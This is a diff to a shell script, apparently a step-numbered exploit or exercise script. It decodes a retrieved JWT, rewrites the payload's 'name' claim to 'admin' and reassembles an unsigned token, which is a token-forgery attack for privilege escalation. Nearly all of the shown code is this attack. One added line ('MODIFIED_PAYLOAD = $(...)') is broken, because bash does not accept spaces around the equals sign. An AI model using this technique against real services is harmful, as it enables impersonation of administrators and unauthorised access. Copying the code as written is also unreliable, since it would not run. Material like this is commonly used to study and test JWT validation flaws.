@@ -39,11 +39,16 @@ echo "--> Token retrieved : $TOKEN"
 
 # Decode / transform / encode token
 echo "2.3 - MODIFY TOKEN"
-PART1=$(echo "$TOKEN" | awk -F. '{print $1}' | base64 -d)
-PART2=$(echo "$TOKEN" | awk -F. '{print $2}' | base64 -d)
-echo "--> Decoded token part 1 : $PART1"
-echo "--> Decoded token part 2 : $PART2"
+HEADER=$(echo "$TOKEN" | awk -F. '{print $1}' | base64 -d)
+PAYLOAD=$(echo "$TOKEN" | awk -F. '{print $2}' | base64 -d)
+echo "--> Decoded token header : $HEADER"
+echo "--> Decoded token payload : $PAYLOAD"
 
-
+MODIFIED_PAYLOAD = $(echo "$PAYLOAD" | jq '.name = "admin"')
+echo "--> Modified token payload : $MODIFIED_PAYLOAD"
+ENCODED_HEADER=$(echo "$HEADER" | base64 | tr -d '\n' | tr -d '=' | sed 's/+/-/g; s/\//_/g')
+ENCODED_PAYLOAD=$(echo "$MODIFIED_PAYLOAD" | base64 | tr -d '\n' | tr -d '=' | sed 's/+/-/g; s/\//_/g')
+UNSIGNED_TOKEN="$ENCODED_HEADER.$ENCODED_PAYLOAD"
+echo "--> Token modified : $UNSIGNED_TOKEN"
 
 
